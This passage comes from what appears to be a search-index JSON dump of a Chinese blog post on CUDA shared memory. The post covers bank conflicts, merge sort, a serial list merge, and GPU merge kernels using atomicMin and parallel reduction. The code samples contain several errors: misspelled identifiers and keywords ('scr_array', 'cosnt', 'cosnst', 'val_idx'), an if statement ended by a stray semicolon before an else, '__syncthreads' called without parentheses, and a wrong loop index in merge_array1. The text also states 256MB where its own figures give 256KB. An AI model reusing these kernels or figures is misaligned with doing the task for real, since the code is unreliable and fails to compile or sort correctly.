f\u4e2a\u7ebf\u7a0b\u4e2d\u3002\u4f46\u662f\uff0c\u5982\u679c\u662f\u5176\u4ed6\u7684\u8bbf\u95ee\u65b9\u5f0f\uff0c\u7ebf\u7a0b\u8bbf\u95ee\u5171\u4eab\u5185\u5b58\u5c31\u9700\u8981\u6392\u961f\uff0c\u5373\u4e00\u4e2a\u7ebf\u7a0b\u8bbf\u95ee\u65f6\uff0c\u5176\u4ed6\u7ebf\u7a0b\u5c06\u963b\u585e\u95f2\u7f6e\u3002\u56e0\u6b64\u5f88\u91cd\u8981\u7684\u4e00\u70b9\u65f6\uff0c\u5e94\u8be5\u5c3d\u53ef\u80fd\u5730\u83b7\u5f97\u96f6\u5b58\u50a8\u4f53\u51b2\u7a81\u7684\u5171\u4eab\u5185\u5b58\u8bbf\u95ee\u3002</li> </ol>"},{"location":"blog/2018/11/25/cuda-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%80%BB%E7%BB%93-%E4%B8%80/#example\u4f7f\u7528\u5171\u4eab\u5185\u5b58\u6392\u5e8f","title":"Example\uff1a\u4f7f\u7528\u5171\u4eab\u5185\u5b58\u6392\u5e8f","text":""},{"location":"blog/2018/11/25/cuda-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%80%BB%E7%BB%93-%E4%B8%80/#\u5f52\u5e76\u6392\u5e8f","title":"\u5f52\u5e76\u6392\u5e8f","text":"<p>\u5047\u8bbe\u5f85\u6392\u5e8f\u7684\u6570\u636e\u96c6\u5927\u5c0f\u4e3a N\uff0c\u73b0\u5c06\u6570\u636e\u96c6\u8fdb\u884c\u5212\u5206\u3002\u6839\u636e\u5f52\u5e76\u6392\u5e8f\u7684\u5212\u5206\u539f\u5219\uff0c\u6700\u540e\u6bcf\u4e2a\u6570\u636e\u5305\u4e2d\u53ea\u6709\u4e24\u4e2a\u6570\u503c\u9700\u8981\u6392\u5e8f\uff0c\u56e0\u6b64\uff0c\u5728\u8fd9\u4e00\u9636\u6bb5\uff0c\u6700\u5927\u5e76\u884c\u5ea6\u53ef\u8fbe\u5230 \\(N \\over 2\\) \u4e2a\u72ec\u7acb\u7ebf\u7a0b\u3002\u4f8b\u5982\uff0c\u5904\u7406\u4e00\u4e2a\u5927\u5c0f\u4e3a 512KB \u7684\u6570\u636e\u96c6\uff0c\u5171\u6709 128K \u4e2a 32 \u4f4d\u7684\u5143\u7d20\uff0c\u90a3\u4e48\u6700\u591a\u53ef\u4ee5\u4f7f\u7528\u7684\u7ebf\u7a0b\u4e2a\u6570\u4e3a 64K \u4e2a\uff08N=128K\uff0cN/2=64K\uff09\uff0c\u5047\u8bbe GPU \u4e0a\u6709 16 \u4e2a SM\uff0c\u6bcf\u4e2a SM \u6700\u591a\u652f\u6301 1536 \u4e2a\u7ebf\u7a0b\uff0c\u90a3\u4e48\u6bcf\u4e2a GPU \u4e0a\u6700\u591a\u53ef\u4ee5\u652f\u6301 24K \u4e2a\u7ebf\u7a0b\uff0c\u56e0\u6b64\uff0c\u6309\u7167\u8fd9\u6837\u5212\u5206\uff0c64K \u7684\u6570\u636e\u5bf9\u53ea\u9700\u8981 2.5 \u6b21\u8fed\u4ee3\u5373\u53ef\u5b8c\u6210\u6392\u5e8f\u64cd\u4f5c\u3002</p> <p>\u4f46\u662f\uff0c\u5982\u679c\u91c7\u7528\u4e0a\u8ff0\u5212\u5206\u6392\u5e8f\u65b9\u5f0f\u518d\u8fdb\u884c\u5408\u5e76\uff0c\u6211\u4eec\u9700\u8981\u4ece\u6bcf\u4e2a\u6392\u597d\u5e8f\u7684\u6570\u636e\u96c6\u4e2d\u8bfb\u51fa\u5143\u7d20\uff0c\u5bf9\u4e8e\u4e00\u4e2a 64K \u7684\u96c6\u5408\uff0c\u9700\u8981 64K \u6b21\u8bfb\u64cd\u4f5c\uff0c\u5373\u4ece\u5185\u5b58\u4e2d\u83b7\u53d6 256MB \u7684\u6570\u636e\uff0c\u663e\u7136\u5f53\u6570\u636e\u96c6\u5f88\u5927\u7684\u65f6\u5019\u4e0d\u5408\u9002\u3002</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u91c7\u7528\u901a\u8fc7\u9650\u5236\u5bf9\u539f\u59cb\u95ee\u9898\u7684\u8fed\u4ee3\u6b21\u6570\uff0c\u901a\u8fc7\u57fa\u4e8e\u5171\u4eab\u5185\u5b58\u7684\u5206\u89e3\u65b9\u5f0f\u6765\u83b7\u5f97\u66f4\u597d\u7684\u5408\u5e76\u65b9\u6848\u3002\u56e0\u4e3a\u5728\u8d39\u7c73\u67b6\u6784\u7684\u8bbe\u5907\u4e0a\u6709 32 \u4e2a\u5b58\u50a8\u4f53\uff0c\u5373\u5bf9\u5e94 32 \u4e2a\u7ebf\u7a0b\uff0c\u6240\u4ee5\u5f53\u9700\u8981\u7684\u7ebf\u7a0b\u6570\u91cf\u51cf\u5c11\u4e3a 32\uff08\u4e00\u4e2a\u7ebf\u7a0b\u675f\uff09\u65f6\uff0c\u505c\u6b62\u8fed\u4ee3\uff0c\u4e8e\u662f\u5171\u9700\u8981\u7ebf\u7a0b\u675f 4K \u4e2a\uff08128K/32=4K\uff09\uff0c\u53c8\u56e0\u4e3a GPU \u4e0a\u6709 16 \u4e2a SM\uff0c\u6240\u4ee5\u8fd9\u5c06\u4e3a\u6bcf\u4e2a SM \u5206\u914d\u5230 256 \u4e2a\u7ebf\u7a0b\u675f\u3002\u7136\u800c\u7531\u4e8e\u8d39\u7c73\u67b6\u6784\u8bbe\u5907\u4e0a\u7684\u6bcf\u4e2a SM \u6700\u591a\u53ea\u80fd\u540c\u65f6\u6267\u884c 48 \u4e2a\u7ebf\u7a0b\u675f\uff0c\u56e0\u6b64\u591a\u4e2a\u5757\u5c06\u88ab\u5faa\u73af\u8bbf\u95ee\u3002</p> <p>\u901a\u8fc7\u5c06\u6570\u636e\u96c6\u4ee5\u6bcf\u884c 32 \u4e2a\u5143\u7d20\u7684\u65b9\u5f0f\u5728\u5171\u4eab\u5185\u5b58\u4e2d\u8fdb\u884c\u5206\u5e03\uff0c\u6bcf\u5217\u4e3a\u4e00\u4e2a\u5b58\u50a8\u4f53\uff0c\u5373\u53ef\u5f97\u5230\u96f6\u5b58\u50a8\u4f53\u51b2\u7a81\u7684\u5185\u5b58\u8bbf\u95ee\uff0c\u7136\u540e\u5bf9\u6bcf\u4e00\u5217\u5b9e\u65bd\u76f8\u540c\u7684\u6392\u5e8f\u7b97\u6cd5\u3002\uff08\u6216\u8005\u4e5f\u53ef\u4ee5\u7406\u89e3\u4e3a\u6876\u6392\u5e8f\u5440\uff09</p> <p>\u7136\u540e\u518d\u8fdb\u884c\u5217\u8868\u7684\u5408\u5e76\u3002</p>"},{"location":"blog/2018/11/25/cuda-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%80%BB%E7%BB%93-%E4%B8%80/#\u5408\u5e76\u5217\u8868","title":"\u5408\u5e76\u5217\u8868","text":"<p>\u5148\u4ece\u4e32\u884c\u5408\u5e76\u4efb\u610f\u6570\u76ee\u7684\u6709\u5e8f\u5217\u8868\u770b\u8d77\uff1a</p> <pre><code>void merge_array(const u32 *const src_array, //\u5f85\u6392\u5e8f\u6570\u7ec4\n                 u32 *const dest_array, //\u6392\u5e8f\u540e\u7684\u6570\u7ec4\n                 const u32 num_lists, //\u5217\u8868\u603b\u6570\n                 const u32 num_elements) //\u6570\u636e\u603b\u6570\n{\n const u32 num_elements_per_list = (num_elements / num_lists);//\u6bcf\u4e2a\u5217\u8868\u4e2d\u7684\u6570\u636e\u4e2a\u6570\n    u32 list_indexes[MAX_NUM_LISTS]; //\u6240\u6709\u5217\u8868\u5f53\u524d\u6240\u5728\u7684\u5143\u7d20\u4e0b\u6807\n    for(u32 list = 0; list &lt; num_lists; list++)\n    {\n  list_indexes[list] = 0;\n    }\n    for(u32 i = 0; i&lt;num_elements; i++)\n    {\n  dest_array[i] = find_min(scr_array,\n                                 list_indexes,\n                                 num_lists,\n                                 num_elements_per_list);\n }\n}\n\nu32 find_min(const u32*cosnt src_array,\n             u32 *const list_indexes,\n             const u32 num_lists,\n             const u32 num_elements_per_list)//\u5bfb\u627e num_lists \u4e2a\u5143\u7d20\u4e2d\u7684\u6700\u5c0f\u503c\n{\n    u32 min_val = 0xFFFFFFFF;\n    u32 min_idx = 0;\n\n    for(u32 i = 0; i &lt; num_lists; i++)\n    {\n  if(list_indexes[i] &lt; num_elements_per_list)\n        {\n   const u32 src_idx = i + (list_indexes[i]*num_lists);\n             const u32 data = src_array[src_idx];\n\n         if(data &lt;= min_val)\n         {\n    min_val = data;\n                 min_idx = i;\n         }\n        }\n    }\n\n    list_indexes[min_idx]++;\n    return min_val;\n}\n</code></pre> <p>\u5c06\u4e0a\u8ff0\u7b97\u6cd5\u7528 GPU \u5b9e\u73b0</p> <pre><code>__global__ void gpu_sort_array_array(u32 *const data,\n                                     const u32 num_lists,\n                                     const u32 num_elements)\n{\n const u32 tid = (blockIdx.x * blockDim.x) + threadIdx.x;\n    __shared__ u32 sort_tmp[NUM_ELEM];\n    __shared__ u32 sort_tmp_1[NUM_ELEM];\n\n    copy_data_to_shared(data, sort_tmp, num_lists, num_elements, tid);\n    radix_sort2(sort_tmp, num_lists, num_elements, tid, sort_tmp_1);\n    merge_array6(sort_tmp, data, num_lists, num_elements, tid);\n}\n</code></pre> <p>\u7b2c\u4e00\u4e2a\u51fd\u6570\u7684\u5b9e\u73b0\uff1a</p> <pre><code>__device__ void copy_data_to_shared(const u32 *const data,\n                                    u32 *sort_tmp,\n                                    const u32 num_lists,\n                                    const u32 num_elements,\n                                    const u32 tid)\n{\n    for(u32 i = 0; i &lt; num_elements; i++)\n    {\n  sort_tmp[i+tid] = data[i+tid];\n    }\n    __syncthreads();\n}\n</code></pre> <p>\u8be5\u51fd\u6570\u4e2d\uff0c\u7a0b\u5e8f\u6309\u884c\u5c06\u6570\u636e\u4ece\u5168\u5c40\u5185\u5b58\u8bfb\u5165\u5171\u4eab\u5185\u5b58\u3002\u5f53\u51fd\u6570\u8c03\u7528\u4e00\u4e2a\u5b50\u51fd\u6570\u5e76\u4f20\u5165\u53c2\u6570\u65f6\uff0c\u8fd9\u4e9b\u53c2\u6570\u5fc5\u987b\u4ee5\u67d0\u79cd\u65b9\u5f0f\u63d0\u4f9b\u7ed9\u88ab\u8c03\u7528\u7684\u51fd\u6570\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u91c7\u7528\u3002\u4e00\u79cd\u662f\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\u6240\u9700\u7684\u503c\uff0c\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a\u201c\u6808\u5e27\u201d\u7684\u5185\u5b58\u533a\uff0c\u4f46\u8fd9\u79cd\u65b9\u6cd5\u975e\u5e38\u5730\u4e0d\u9ad8\u6548\u3002\u51fa\u4e8e\u8fd9\u4e00\u539f\u56e0\uff0c\u6211\u4eec\u9700\u8981\u91cd\u65b0\u4fee\u6539\u5408\u5e76\u7684\u7a0b\u5e8f (merge_array)\uff0c\u4ee5\u907f\u514d\u51fd\u6570\u8c03\u7528\uff0c\u4fee\u6539\u540e\u7a0b\u5e8f\u5982\u4e0b\uff08\u5355\u7ebf\u7a0b\uff09\uff1a</p> <pre><code>__device__ void merge_array1(const u32 *const src_array,\n                             u32 *const dest_array,\n                             const u32 num_lists,\n                             const u32 num_elements,\n                             const u32 tid)\n{\n __shared__ u32 list_indexes[MAX_NUM_LISTS];\n\n    lists_indexes[tid] = 0;//\u4ece\u6bcf\u4e2a\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u5f00\u59cb\n    __syncthreads();\n\n    //\u5355\u7ebf\u7a0b\n    if(tid == 0)\n    {\n  const u32 num_elements_per_list = (num_elements / num_lists);\n        for(u32 i = 0; i &lt; num_elements; i++)\n        {\n   u32 min_val = 0xFFFFFFFF;\n             u32 min_idx = 0;\n\n            for(u32 list = 0; list &lt; num_lists; list++)\n        {\n   if(list_indexes[list] &lt; num_elements_per_list)\n         {\n      const u32 src_idx = i + (list_indexes[i]*num_lists);\n              const u32 data = src_array[src_idx];\n          if(data &lt;= min_val)\n          {\n     min_val = data;\n                   min_idx = i;\n                }\n         }\n          }\n          list_indexes[min_idx]++;\n          dest_array[i]=min_val;\n       }\n    }\n}\n</code></pre> <p>\u8fd9\u91cc\u53ea\u7528\u4e00\u4e2a\u7ebf\u7a0b\u8fdb\u884c\u5408\u5e76\uff0c\u4f46\u663e\u7136\uff0c\u4e3a\u4e86\u83b7\u5f97\u66f4\u597d\u7684\u6027\u80fd\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u662f\u8fdc\u8fdc\u4e0d\u591f\u7684\u3002\u56e0\u4e3a\u6570\u636e\u88ab\u5199\u5230\u4e00\u4e2a\u5355\u4e00\u7684\u5217\u8868\u4e2d\uff0c\u6240\u4ee5\u591a\u4e2a\u7ebf\u7a0b\u5fc5\u987b\u8fdb\u884c\u67d0\u79cd\u5f62\u5f0f\u7684\u5408\u4f5c\u3002</p> <pre><code>__device__ void merge_array6(const u32 *const src_array,\n                             u32 *const dest_array,\n                             const u32 num_lists,\n                             const u32 num_elements,\n                             const u32 tid)\n{\n    //\u6bcf\u4e2a\u5217\u8868\u5206\u5230\u7684\u5143\u7d20\u4e2a\u6570\n const u32 num_elements_per_list = (num_elements / num_lists);\n\n    //\u521b\u5efa\u4e00\u4e2a\u5171\u4eab\u5217\u8868\u6570\u7ec4\uff0c\u7528\u6765\u50a8\u5b58\u5f53\u524d\u7ebf\u7a0b\u6240\u8bbf\u95ee\u7684\u5217\u8868\u5143\u7d20\u4e0b\u6807\n    __shared__ u32 list_indexes[MAX_NUM_LISTS];\n    list_indexes[tid] = 0;\n\n    //\u521b\u5efa\u6240\u6709\u7ebf\u7a0b\u5171\u4eab\u7684\u6700\u5c0f\u503c\u4e0e\u6700\u5c0f\u503c\u7ebf\u7a0b\u53f7\n    __shared__ u32 min_val;\n    __shared__ u32 min_tid;\n    __syncthreads();\n\n    for(u32 i=0; i&lt;num_elements; i++)\n    {\n        u32 data;\n        //\u5982\u679c\u5f53\u524d\u5217\u8868\u8fd8\u672a\u88ab\u8bfb\u5b8c\uff0c\u5219\u4ece\u4e2d\u8bfb\u53d6\u6570\u636e\n        if(list_indexes[tid] &lt; num_elements_per_list);\n        {\n             //\u8ba1\u7b97\u51fa\u5f53\u524d\u5143\u7d20\u5728\u539f\u6570\u7ec4\u4e2d\u7684\u4e0b\u6807\n   const u32 src_idx = tid + (list_indexes[tid] * num_lists);\n             data = src_array[src_idx];\n        }\n        else\n        {\n   data = 0xFFFFFFFF;\n        }\n\n        //\u7528\u96f6\u53f7\u7ebf\u7a0b\u6765\u521d\u59cb\u5316\u6700\u5c0f\u503c\u4e0e\u6700\u5c0f\u503c\u7ebf\u7a0b\u53f7\n        if(tid == 0)\n        {\n   min_val = 0xFFFFFFFF;\n             min_tid = 0xFFFFFFFF;\n        }\n        __syncthreads();\n\n        //\u8ba9\u6240\u6709\u7ebf\u7a0b\u90fd\u5c1d\u8bd5\u5c06\u5b83\u4eec\u73b0\u5728\u624b\u4e0a\u6709\u7684\u503c\u5199\u5165min_val\uff0c\u4f46\u53ea\u6709\u6700\u5c0f\u7684\u6570\u636e\u4f1a\u88ab\u4fdd\u7559\n        //\u5229\u7528__syncthreads()\u786e\u4fdd\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6267\u884c\u4e86\u8be5\u64cd\u4f5c\n        atomicMin(&amp;min_val, data);\n        __syncthreads();\n\n        //\u5728\u6240\u6709data==min_val\u7684\u7ebf\u7a0b\u4e2d\uff0c\u9009\u53d6\u6700\u5c0f\u7ebf\u7a0b\u53f7\u5199\u5165min_tid\n        if(min_val == data)\n        {\n   atomicMin(&amp;min_tid, tid);\n        }\n        __syncthreads();\n\n        //\u5c06\u6ee1\u8db3\u8981\u6c42\u7684\u7ebf\u7a0b\u6240\u5728\u5217\u8868\u7684\u5f53\u524d\u5143\u7d20\u5f80\u540e\u79fb\u4e00\u4f4d\uff0c\u8fdb\u884c\u4e0b\u4e00\u8f6e\u6bd4\u8f83\n        //\u5e76\u5c06\u7b5b\u9009\u7ed3\u679c\u5b58\u5165\u7ed3\u679c\u6570\u7ec4dest_array\n        if(tid == min_tid)\n        {\n   list_indexes[tid]++;\n             dest_array[i] = data;\n        }\n    }\n}\n</code></pre> <p>\u4e0a\u9762\u7684\u51fd\u6570\u4e2d\u5c06 num_lists \u4e2a\u7ebf\u7a0b\u8fdb\u884c\u5408\u5e76\u64cd\u4f5c\uff0c\u4f46\u53ea\u7528\u4e86\u4e00\u4e2a\u7ebf\u7a0b\u4e00\u6b21\u5c06\u7ed3\u679c\u5199\u5165\u7ed3\u679c\u6570\u636e\u6570\u7ec4\u4e2d\uff0c\u4fdd\u8bc1\u4e86\u7ed3\u679c\u7684\u6b63\u786e\u6027\uff0c\u4e0d\u4f1a\u5f15\u8d77\u7ebf\u7a0b\u95f4\u7684\u51b2\u7a81\u3002</p> <p>\u5176\u4e2d\u4f7f\u7528\u5230\u4e86 atomicMin \u51fd\u6570\u3002\u6bcf\u4e2a\u7ebf\u7a0b\u4ee5\u4ece\u5217\u8868\u4e2d\u83b7\u53d6\u7684\u6570\u636e\u4f5c\u4e3a\u5165\u53c2\u8c03\u7528\u8be5\u51fd\u6570\uff0c\u53d6\u4ee3\u4e86\u539f\u5148\u5355\u7ebf\u7a0b\u8bbf\u95ee\u5217\u8868\u4e2d\u6240\u6709\u5143\u7d20\u5e76\u627e\u51fa\u6700\u5c0f\u503c\u7684\u64cd\u4f5c\u3002\u5f53\u6bcf\u4e2a\u7ebf\u7a0b\u8c03\u7528 atomicMin \u51fd\u6570\u65f6\uff0c\u7ebf\u7a0b\u8bfb\u53d6\u4fdd\u5b58\u5728\u5171\u4eab\u5185\u5b58\u4e2d\u7684\u6700\u5c0f\u503c\u5e76\u4e8e\u5f53\u524d\u7ebf\u7a0b\u4e2d\u7684\u503c\u8fdb\u884c\u6bd4\u8f83\uff0c\u7136\u540e\u628a\u6bd4\u8f83\u7ed3\u679c\u91cd\u65b0\u5199\u56de\u6700\u5c0f\u503c\u5bf9\u5e94\u7684\u5171\u4eab\u5185\u5b58\u4e2d\uff0c\u540c\u65f6\u66f4\u65b0\u6700\u5c0f\u503c\u5bf9\u5e94\u7684\u7ebf\u7a0b\u53f7\u3002\u7136\u800c\uff0c\u7531\u4e8e\u5217\u8868\u4e2d\u7684\u6570\u636e\u53ef\u80fd\u4f1a\u91cd\u590d\uff0c\u56e0\u6b64\u53ef\u80fd\u51fa\u73b0\u591a\u4e2a\u7ebf\u7a0b\u7684\u503c\u5747\u4e3a\u6700\u5c0f\u503c\u7684\u60c5\u51b5\uff0c\u4fdd\u7559\u7684\u7ebf\u7a0b\u53f7\u5374\u5404\u4e0d\u76f8\u540c\u3002\u56e0\u6b64\u9700\u8981\u6267\u884c\u7b2c\u4e8c\u6b65\u64cd\u4f5c\uff0c\u4fdd\u8bc1\u4fdd\u7559\u7684\u7ebf\u7a0b\u53f7\u4e3a\u6700\u5c0f\u7ebf\u7a0b\u53f7\u3002</p> <p>\u867d\u7136\u8fd9\u79cd\u65b9\u6cd5\u7684\u4f18\u5316\u6548\u679c\u5f88\u663e\u8457\uff0c\u4f46\u5b83\u4e5f\u6709\u4e00\u5b9a\u7684\u52a3\u52bf\u3002\u4f8b\u5982\uff0catomicMin \u51fd\u6570\u53ea\u80fd\u7528\u5728\u8ba1\u7b97\u80fd\u529b\u4e3a 1.2 \u4ee5\u4e0a\u7684\u8bbe\u5907\u4e0a\uff1b\u53e6\u5916\uff0caotomicMin \u51fd\u6570\u53ea\u652f\u6301\u6574\u6570\u578b\u8fd0\u7b97\uff0c\u4f46\u73b0\u5b9e\u4e16\u754c\u4e2d\u7684\u95ee\u9898\u901a\u5e38\u662f\u57fa\u4e8e\u6d6e\u70b9\u8fd0\u7b97\u7684\uff0c\u56e0\u6b64\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u9700\u8981\u5bfb\u627e\u65b0\u7684\u89e3\u51b3\u65b9\u6cd5\u3002</p>"},{"location":"blog/2018/11/25/cuda-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%80%BB%E7%BB%93-%E4%B8%80/#\u5e76\u884c\u5f52\u7ea6","title":"\u5e76\u884c\u5f52\u7ea6","text":"<p>\u5e76\u884c\u5f52\u7ea6\u9002\u7528\u4e8e\u8bb8\u591a\u95ee\u9898\uff0c\u6c42\u6700\u5c0f\u503c\u53ea\u662f\u5176\u4e2d\u7684\u4e00\u79cd\u3002\u5b83\u4f7f\u7528\u6570\u636e\u96c6\u5143\u7d20\u6570\u91cf\u4e00\u534a\u7684\u7ebf\u7a0b\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u5c06\u5f53\u524d\u7ebf\u7a0b\u5bf9\u5e94\u7684\u5143\u7d20\u4e0e\u53e6\u4e00\u4e2a\u5143\u7d20\u8fdb\u884c\u6bd4\u8f83\uff0c\u8ba1\u7b97\u4e24\u8005\u4e4b\u95f4\u7684\u6700\u5c0f\u503c\uff0c\u5e76\u5c06\u5f97\u5230\u7684\u6700\u5c0f\u503c\u79fb\u5230\u524d\u9762\u3002\u6bcf\u8fdb\u884c\u4e00\u6b21\u6bd4\u8f83\uff0c\u7ebf\u7a0b\u6570\u51cf\u5c11\u4e00\u534a\uff0c\u5982\u6b64\u53cd\u590d\u76f4\u5230\u53ea\u5269\u4e00\u4e2a\u5143\u7d20\u4e3a\u6b62\uff0c\u8fd9\u4e2a\u5143\u7d20\u5c31\u662f\u9700\u8981\u7684\u6700\u5c0f\u503c\u3002</p> <p>\u5728\u9009\u62e9\u6bd4\u8f83\u5143\u7d20\u7684\u65f6\u5019\uff0c\u5e94\u8be5\u5c3d\u91cf\u907f\u514d\u9009\u62e9\u540c\u4e00\u4e2a\u7ebf\u7a0b\u675f\u4e2d\u7684\u5143\u7d20\u8fdb\u884c\u6bd4\u8f83\uff0c\u56e0\u4e3a\u8fd9\u4f1a\u660e\u663e\u5730\u5bfc\u81f4\u7ebf\u7a0b\u675f\u5185\u4ea7\u751f\u5206\u652f\uff0c\u800c\u6bcf\u4e2a\u5206\u652f\u90fd\u5c06\u4f7f SM \u505a\u53cc\u500d\u7684\u5de5\u4f5c\uff0c\u7ee7\u800c\u5f71\u54cd\u7a0b\u5e8f\u7684\u6027\u80fd\u3002\u56e0\u6b64\u6211\u4eec\u9009\u62e9\u5c06\u7ebf\u7a0b\u675f\u4e2d\u7684\u5143\u7d20\u4e0e\u53e6\u4e00\u534a\u6570\u636e\u96c6\u4e2d\u7684\u5143\u7d20\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u4e0b\u56fe\uff0c\u9634\u5f71\u90e8\u5206\u8868\u793a\u5f53\u524d\u6d3b\u8dc3\u7684\u7ebf\u7a0b\u3002</p> <p></p> <pre><code>__device__ void merge_array5(const u32 *const src_array,\n                             u32 *const dest_array,\n                             const u32 num_lists,\n                             const u32 num_elements,\n                             const u32 tid)\n{\n const u32 num_elements_per_list = (num_elements / num_lists);\n\n    __shared__ u32 list_indexes[MAX_NUM_LISTS];\n    __shared__ u32 reduction_val[MAX_NUM_LISTS];\n    __shared__ u32 reduction_idx[MAX_NUM_LISTS];\n\n    list_indexes[tid] = 0;\n    reduction_val[tid] = 0;\n    reduction_idx[tid] = 0;\n    __syncthreads();\n\n    for(u32 i=0; i&lt;num_elements; i++)\n    {\n  u32 tid_max = num_lists &gt;&gt; 1;//\u6700\u5927\u7ebf\u7a0b\u6570\u4e3a\u5217\u8868\u603b\u6570\u7684\u4e00\u534a\n         u32 data;//\u4f7f\u7528\u5bc4\u5b58\u5668\u53ef\u4ee5\u63d0\u9ad8\u8fd0\u884c\u6548\u7387\uff0c\u5c06\u5bf9\u5171\u4eab\u5185\u5b58\u7684\u5199\u64cd\u4f5c\u6b21\u6570\u51cf\u5c11\u4e3a1\n\n        //\u5f53\u5217\u8868\u4e2d\u8fd8\u6709\u672a\u5904\u7406\u5b8c\u7684\u5143\u7d20\u65f6\n         if(list_indexes[tid] &lt; num_elements_per_list)\n         {\n             //\u8ba1\u7b97\u8be5\u5143\u7d20\u5728\u539f\u6570\u7ec4\u4e2d\u7684\u4f4d\u7f6e\n   cosnst u32 src_idx = tid + (list_indexes[tid] * num_lists);\n             data = src_array[src_idx];\n         }\n        //\u82e5\u5f53\u524d\u5217\u8868\u5df2\u7ecf\u5904\u7406\u5b8c\uff0c\u5c06data\u8d4b\u503c\u6700\u5927\n        else\n        {\n   data = 0xFFFFFFFF;\n        }\n\n        //\u5c06\u5f53\u524d\u5143\u7d20\u53ca\u7ebf\u7a0b\u53f7\u5199\u5165\u5171\u4eab\u5185\u5b58\n        reduction_val[tid] = data;\n        reduction_idx[tid] = tid;\n        __syncthreads;\n\n        //\u5f53\u524d\u6d3b\u8dc3\u7684\u7ebf\u7a0b\u6570\u591a\u4e8e\u4e00\u4e2a\u65f6\n        while(tid_max!=0)\n        {\n            if(tid &lt; tid_max)\n            {\n                 //\u5c06\u5f53\u524d\u7ebf\u7a0b\u4e2d\u7684\u5143\u7d20\u4e0e\u53e6\u4e00\u534a\u6570\u636e\u96c6\u4e2d\u7684\u5bf9\u5e94\u5143\u7d20\u8fdb\u884c\u6bd4\u8f83\n    const u32 val2_idx = tid + tid_max;\n                 const u32 val2 = reduction_val[val2_idx];\n\n                 //\u6700\u540e\u4fdd\u7559\u8f83\u5c0f\u7684\u90a3\u4e2a\u5143\u7d20\n                 if(reduction_val[tid] &gt; val2)\n                 {\n     reduction_val[tid] = val2;\n                      reduction_idx[tid] = reduction_idx[val_idx];\n                 }\n            }\n\n            //\u7ebf\u7a0b\u6570\u51cf\u534a\uff0c\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5faa\u73af\n            tid_max &gt;&gt;= 1;\n            __syncthreads();\n        }\n\n        //\u5728\u96f6\u53f7\u7ebf\u7a0b\u4e2d\u5c06\u7ed3\u679c\u5199\u5165\u7ed3\u679c\u6570\u7ec4\uff0c\u5e76\u5c06\u76f8\u5e94\u7ebf\u7a0b\u6240\u6307\u7684\u5143\u7d20\u540e\u79fb\u4e00\u4f4d\n        if(tid == 0)\n        {\n   list_indexes[reduction_idx[0]]++;\n             dest_array[i] = reduction_val[0];\n        }\n        __syncthreads();\n    }\n}\n</code></pre> <p>\u540c\u6837\uff0c\u8fd9\u79cd\u65b9\u6cd5\u4e5f\u5728\u5171\u4eab\u5185\u5b58\u4e2d\u521b\u5efa\u4e86\u4e00\u4e2a\u4e34\u65f6\u7684\u5217\u8868 list_indexes \u7528\u6765\u4fdd\u5b58\u6bcf\u6b21\u5faa\u73af\u4e2d\u4ece num_list \u4e2a\u6570\u636e\u96c6\u5217\u8868\u4e2d\u9009\u53d6\u51fa\u6765\u8fdb\u884c\u6bd4\u8f83\u7684\u6570\u636e\u3002\u5982\u679c\u8fdb\u884c\u5408\u5e76\u7684\u5217\u8868\u5df2\u7ecf\u4e3a\u7a7a\uff0c\u90a3\u4e48\u5c31\u5c06\u4e34\u65f6\u5217\u8868\u4e2d\u7684\u5bf9\u5e94\u6570\u636e\u533a\u8d4b\u6700\u5927\u503c 0xFFFFFFFF\u3002\u800c\u6bcf\u8f6e while \u5faa\u73af\u540e\uff0c\u6d3b\u8dc3\u7684\u7ebf\u7a0b\u6570\u90fd\u5c06\u51cf\u5c11\u4e00\u534a\uff0c\u76f4\u5230\u6700\u540e\u53ea\u5269\u4e00\u4e2a\u6d3b\u8dc3\u7684\u7ebf\u7a0b\uff0c\u4ea6\u5373\u96f6\u53f7\u7ebf\u7a0b\u3002\u6700\u540e\u5c06\u7ed3\u679c\u590d\u5236\u5230\u7ed3\u679c\u6570\u7ec4\u4e2d\u5e76\u5c06\u6700\u5c0f\u503c\u6240\u5bf9\u5e94\u7684\u5217\u8868\u7d22\u5f15\u52a0\u4e00\uff0c\u4ee5\u786e\u4fdd\u5143\u7d20\u4e0d\u4f1a\u88ab\u5904\u7406\u4e24\u6b21\u3002</p>"},{"location":"blog/2018/11/25/cuda-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%80%BB%E7%BB%93-%E4%B8%80/#\u6df7\u5408\u7b97\u6cd5","title":"\u6df7\u5408\u7b97\u6cd5","text":"<p>\u5728\u4e86\u89e3 atomicMin \u51fd\u6570\u548c\u5e76\u884c\u5f52\u7ea6\u4e24\u79cd\u65b9\u6848\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e24\u79cd\u7b97\u6cd5\u5404\u81ea\u7684\u4f18\u70b9\uff0c\u521b\u9020\u51fa\u4e00\u79cd\u65b0\u7684\u6df7\u5408\u65b9\u6848\u3002</p> <p>\u7b80\u5355\u7684 1~N \u4e2a\u6570\u636e\u5f52\u7ea6\u7684\u4e00\u4e2a\u4e3b\u8981\u95ee\u9898\u5c31\u662f\u5f53 N \u589e\u5927\u65f6\uff0c\u7a0b\u5e8f\u7684\u901f\u5ea6\u5148\u53d8\u5feb\u518d\u53d8\u6162\uff0c\u8fbe\u5230\u6700\u9ad8\u6548\u7684\u60c5\u5f62\u65f6 N \u5728 8 \u81f3 16 